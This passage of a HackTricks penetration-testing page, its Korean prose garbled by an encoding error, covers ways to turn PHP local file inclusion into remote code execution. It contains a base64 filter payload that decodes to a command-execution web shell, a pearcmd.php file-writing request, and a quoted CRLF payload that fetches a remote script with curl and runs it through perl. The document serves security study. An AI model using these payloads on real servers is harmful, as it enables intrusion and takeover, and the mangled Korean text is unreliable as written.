1. ë¡œê·¸ì¸ ê³¼ì •ì—ì„œ ì‚¬ìš©ì ì´ë¦„ í•„ë“œì— PHP í˜ì´ë¡œë“œë¥¼ ì£¼ì…í•©ë‹ˆë‹¤.
2. ì£¼ì… í›„, LFIë¥¼ ì´ìš©í•˜ì—¬ _**/var/log/vsftpd.log**_ì—ì„œ ì„œë²„ ë¡œê·¸ë¥¼ ê²€ìƒ‰í•©ë‹ˆë‹¤.

### Via php base64 filter (using base64)

[ì´](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) ê¸°ì‚¬ì—ì„œ ë³´ì—¬ì¤€ ê²ƒì²˜ëŸ¼, PHP base64 í•„í„°ëŠ” Non-base64ë¥¼ ë¬´ì‹œí•©ë‹ˆë‹¤. ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ íŒŒì¼ í™•ì¥ì ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: ".php"ë¡œ ëë‚˜ëŠ” base64ë¥¼ ì œê³µí•˜ë©´, "."ë¥¼ ë¬´ì‹œí•˜ê³  "php"ë¥¼ base64ì— ì¶”ê°€í•©ë‹ˆë‹¤. ë‹¤ìŒì€ ì˜ˆì‹œ í˜ì´ë¡œë“œì…ë‹ˆë‹¤:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

ì´ [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)ëŠ” **php í•„í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„ì˜ì˜ ì½˜í…ì¸ **ë¥¼ ì¶œë ¥ìœ¼ë¡œ ìƒì„±í•  ìˆ˜ ìˆìŒì„ ì„¤ëª…í•©ë‹ˆë‹¤. ì´ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **íŒŒì¼ì— ì‘ì„±í•  í•„ìš” ì—†ì´** í¬í•¨í•  **ì„ì˜ì˜ php ì½”ë“œë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.**

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via segmentation fault

**íŒŒì¼ì„ ì—…ë¡œë“œ**í•˜ì—¬ `/tmp`ì— **ì„ì‹œë¡œ** ì €ì¥í•œ ë‹¤ìŒ, **ê°™ì€ ìš”ì²­ì—ì„œ** **ì„¸ê·¸ë©˜í…Œì´ì…˜ ì˜¤ë¥˜**ë¥¼ ë°œìƒì‹œí‚¤ë©´ **ì„ì‹œ íŒŒì¼ì´ ì‚­ì œë˜ì§€ ì•Šê³ ** ì´ë¥¼ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via Nginx temp file storage

**ë¡œì»¬ íŒŒì¼ í¬í•¨**ì„ ë°œê²¬í•˜ê³  **Nginx**ê°€ PHP ì•ì—ì„œ ì‹¤í–‰ë˜ê³  ìˆë‹¤ë©´ ë‹¤ìŒ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

**ë¡œì»¬ íŒŒì¼ í¬í•¨**ì„ ë°œê²¬í–ˆì§€ë§Œ **ì„¸ì…˜ì´ ì—†ê³ ** `session.auto_start`ê°€ `Off`ì¸ ê²½ìš°ì—ë„ ê°€ëŠ¥í•©ë‹ˆë‹¤. **ë©€í‹°íŒŒíŠ¸ POST** ë°ì´í„°ì— **`PHP_SESSION_UPLOAD_PROGRESS`**ë¥¼ ì œê³µí•˜ë©´ PHPê°€ **ì„¸ì…˜ì„ í™œì„±í™”í•©ë‹ˆë‹¤**. ì´ë¥¼ ì•…ìš©í•˜ì—¬ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Via temp file uploads in Windows

**ë¡œì»¬ íŒŒì¼ í¬í•¨**ì„ ë°œê²¬í•˜ê³  ì„œë²„ê°€ **Windows**ì—ì„œ ì‹¤í–‰ë˜ê³  ìˆë‹¤ë©´ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via `pearcmd.php` + URL args

[**ì´ ê²Œì‹œë¬¼ì—ì„œ ì„¤ëª…ëœ ë°”ì™€ ê°™ì´**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), ìŠ¤í¬ë¦½íŠ¸ `/usr/local/lib/phppearcmd.php`ëŠ” php ë„ì»¤ ì´ë¯¸ì§€ì—ì„œ ê¸°ë³¸ì ìœ¼ë¡œ ì¡´ì¬í•©ë‹ˆë‹¤. ë˜í•œ, URL ë§¤ê°œë³€ìˆ˜ì— `=`ê°€ ì—†ìœ¼ë©´ ì¸ìˆ˜ë¡œ ì‚¬ìš©í•´ì•¼ í•œë‹¤ê³  ëª…ì‹œë˜ì–´ ìˆê¸° ë•Œë¬¸ì— URLì„ í†µí•´ ìŠ¤í¬ë¦½íŠ¸ì— ì¸ìˆ˜ë¥¼ ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ìŒ ìš”ì²­ì€ `/tmp/hello.php`ì— `<?=phpinfo()?>`ë¼ëŠ” ì½˜í…ì¸ ë¡œ íŒŒì¼ì„ ìƒì„±í•©ë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
{% endcode %}

ë‹¤ìŒì€ CRLF ì·¨ì•½ì ì„ ì•…ìš©í•˜ì—¬ RCEë¥¼ ì–»ëŠ” ë°©ë²•ì…ë‹ˆë‹¤ (ì¶œì²˜: [**ì—¬ê¸°**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo()ë¥¼ í†µí•œ ë°©ë²• (file\_uploads = on)

**Local File Inclusion**ì„ ë°œê²¬í•˜ê³  file\_uploads = onì¸ **phpinfo()**ë¥¼ ë…¸ì¶œí•˜ëŠ” íŒŒì¼ì„ ì°¾ì•˜ë‹¤ë©´ RCEë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + ê²½ë¡œ ë…¸ì¶œì„ í†µí•œ ë°©ë²•

**Local File Inclusion**ì„ ë°œê²¬í•˜ê³  **ì„ì‹œ íŒŒì¼ì˜ ê²½ë¡œë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆì§€ë§Œ** **ì„œë²„**ê°€ **í¬í•¨í•  íŒŒì¼ì— PHP ë§ˆí¬ê°€ ìˆëŠ”ì§€ í™•ì¸**í•˜ê³  ìˆë‹¤ë©´, ì´ **ê²½ìŸ ì¡°ê±´**ì„ ì‚¬ìš©í•˜ì—¬ **ê·¸ ê²€ì‚¬ë¥¼ ìš°íšŒ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### ì˜ì›í•œ ëŒ€ê¸° + ë¸Œë£¨íŠ¸í¬ìŠ¤ ë°©ë²•

LFIë¥¼ ì•…ìš©í•˜ì—¬ **ì„ì‹œ íŒŒì¼ì„ ì—…ë¡œë“œ**í•˜ê³  ì„œë²„ê°€ PHP ì‹¤í–‰ì„ **ì¤‘ë‹¨**í•˜ê²Œ ë§Œë“¤ ìˆ˜ ìˆë‹¤ë©´, **ëª‡ ì‹œê°„ ë™ì•ˆ íŒŒì¼ ì´ë¦„ì„ ë¸Œë£¨íŠ¸í¬ìŠ¤**í•˜ì—¬ ì„ì‹œ íŒŒì¼ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### ì¹˜ëª…ì ì¸ ì˜¤ë¥˜ë¡œ

`/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` ì¤‘ í•˜ë‚˜ì˜ íŒŒì¼ì„ í¬í•¨í•˜ë©´ ë©ë‹ˆë‹¤. (ê·¸ ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œí‚¤ê¸° ìœ„í•´ ê°™ì€ íŒŒì¼ì„ 2ë²ˆ í¬í•¨í•´ì•¼ í•©ë‹ˆë‹¤).

**ì´ê²ƒì´ ì–´ë–»ê²Œ ìœ ìš©í•œì§€ëŠ” ëª¨ë¥´ê² ì§€ë§Œ, ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**\
_ë¹„ë¡ PHP ì¹˜ëª…ì ì¸ ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œì¼œë„, ì—…ë¡œë“œëœ PHP ì„ì‹œ íŒŒì¼ì€ ì‚­ì œë©ë‹ˆë‹¤._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## ì°¸ê³ ìë£Œ

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

ê²½í—˜ì´ í’ë¶€í•œ í•´ì»¤ ë° ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ì™€ ì†Œí†µí•˜ê¸° ìœ„í•´ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ì°¸ì—¬í•˜ì„¸ìš”!

**í•´í‚¹ í†µì°°ë ¥**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì— ëŒ€í•´ ê¹Šì´ ìˆëŠ” ì½˜í…ì¸ ì— ì°¸ì—¬í•˜ì„¸ìš”.

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ë ¥ì„ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ë¥¼ ìµœì‹  ìƒíƒœë¡œ ìœ ì§€í•˜ì„¸ìš”.

**ìµœì‹  ê³µì§€ì‚¬í•­**\
ìƒˆë¡œìš´ ë²„ê·¸ ë°”ìš´í‹°ì™€ ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•œ ì •ë³´ë¥¼ ë°›ì•„ë³´ì„¸ìš”.

ì˜¤ëŠ˜ [**Discord**](https://discord.com/invite/N3FrSbmwdy)ì— ì°¸ì—¬í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê³  ì—°ìŠµí•˜ê¸°:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê³  ì—°ìŠµí•˜ê¸°: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
